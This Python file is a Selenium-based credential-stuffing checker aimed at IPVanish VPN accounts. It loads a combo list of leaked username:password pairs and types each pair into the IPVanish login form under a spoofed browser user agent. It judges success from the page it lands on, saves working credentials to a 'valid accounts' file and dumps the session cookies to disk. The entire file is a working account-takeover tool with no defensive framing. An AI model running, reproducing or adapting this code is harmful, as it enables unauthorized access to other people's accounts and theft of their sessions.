import json
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By


class BrowserInit:

    def __init__(self, page):
        self.usr = []
        self.passw = []
        self.browser_options = Options()
        self.browser_options.add_argument('User-Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                                          'Chrome/121.0.0.0 Safari/537.36"')
        self.browser = webdriver.Chrome(options=self.browser_options)
        self.page = page
        self.directory = "combos/ipvanish"

    def get_and_split_list(self):
        user = []
        password = []
        try:
            with open(self.directory, 'r') as combos:
                for line in combos.readlines():
                    user.append(line.split(":")[0].strip())
                    password.append(line.split(":")[1].strip())
            combos.close()
        except FileNotFoundError:
            print("Combo list not found. Make sure it's placed in {} and named 'ipvanish'."
                  .format(self.directory))
            exit()
        return user, password

    def open_page_and_enter_credentials(self, usr, passw):
        self.browser.get(self.page)
        self.browser.set_window_size(400,400)
        email = self.browser.find_element(By.XPATH, '//input[@type="email"]')
        password_box = self.browser.find_element(By.XPATH, '//input[@type="password"]')
        button = self.browser.find_element(By.XPATH, '//button[@tabindex="3"]')
        email.send_keys(usr)
        password_box.send_keys(passw)
        button.click()
        time.sleep(4)

    def check_validity_and_store_if_valid(self, usr, passw):
        if "https://my.ipvanish.com/vpn/" in self.browser.current_url or "https://account.ipvanish.com/index.php" in self.browser.current_url:
            print("{}:{} is a valid account...".format(usr,passw))
            with open("valid/ipvanish_valid_accounts", 'a') as valid_accounts:
                valid_accounts.write(usr + ":" + passw + "\n")
        else:
            print("{}:{} is Invalid you wallad...".format(usr, passw))

    def get_cookie(self, d):
        with open(d, 'w') as write_cookie:
            json.dump(self.browser.get_cookies(), write_cookie, indent=3)
